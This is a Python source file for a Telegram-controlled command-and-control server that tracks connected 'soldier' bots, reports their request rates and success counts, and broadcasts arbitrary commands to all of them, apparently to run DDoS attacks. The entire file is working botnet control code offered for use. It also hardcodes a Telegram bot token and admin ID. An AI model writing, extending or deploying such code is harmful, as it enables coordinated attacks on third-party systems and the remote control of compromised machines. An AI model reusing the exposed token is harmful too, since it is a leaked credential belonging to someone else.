import telebot
import socket
import threading
import json

# --- CONFIG ---
BOT_TOKEN = "7910720967:AAH-zcMo7RSnE0TlR524evJfNYOyUXLCNiU"
ADMIN_ID = 7537846487
PORT = 9090  # Port to listen for soldier clients

bot = telebot.TeleBot(BOT_TOKEN)
soldiers = {}
lock = threading.Lock()

# --- Handle soldier client connections ---
def handle_client(conn, addr):
    try:
        conn.settimeout(10)
        data = conn.recv(4096)
        if not data:
            conn.close()
            return

        soldier_info = json.loads(data.decode())
        sid = soldier_info.get("id")

        with lock:
            soldiers[sid] = {
                "conn": conn,
                "addr": addr,
                "stats": soldier_info
            }

        while True:
            stats = conn.recv(4096)
            if not stats:
                break
            with lock:
                soldiers[sid]["stats"] = json.loads(stats.decode())

    except Exception as e:
        print(f"Connection error: {e}")
    finally:
        with lock:
            if sid in soldiers:
                del soldiers[sid]
        conn.close()

# --- TCP Server for soldier nodes ---
def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", PORT))
    server.listen(50)
    print(f"[+] Listening for soldiers on port {PORT}...")
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

# --- Telegram Commands ---
@bot.message_handler(commands=["start"])
def cmd_start(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.reply_to(message, "🤖 C2 Bot is active. Use /status to view soldier info.")

@bot.message_handler(commands=["status"])
def cmd_status(message):
    if message.from_user.id != ADMIN_ID:
        return
    with lock:
        count = len(soldiers)
        msg = f"👮 Total Active Soldiers: {count}\n"
        for sid, info in soldiers.items():
            s = info["stats"]
            msg += f"\n🧠 ID: {sid}\nIP: {info['addr'][0]}\nRPS: {s['rps']}\nSuccess: {s['success']} | Fail: {s['fail']}\n"
    bot.reply_to(message, msg)

@bot.message_handler(commands=["broadcast"])
def cmd_broadcast(message):
    if message.from_user.id != ADMIN_ID:
        return
    cmd = message.text.split(" ", 1)
    if len(cmd) < 2:
        bot.reply_to(message, "❗ Usage: /broadcast <command>")
        return
    command = cmd[1]
    with lock:
        for sid, info in soldiers.items():
            try:
                info["conn"].send(command.encode())
            except:
                pass
    bot.reply_to(message, "📢 Command sent to all soldiers.")

# --- Start Everything ---
threading.Thread(target=start_server, daemon=True).start()
bot.infinity_polling()
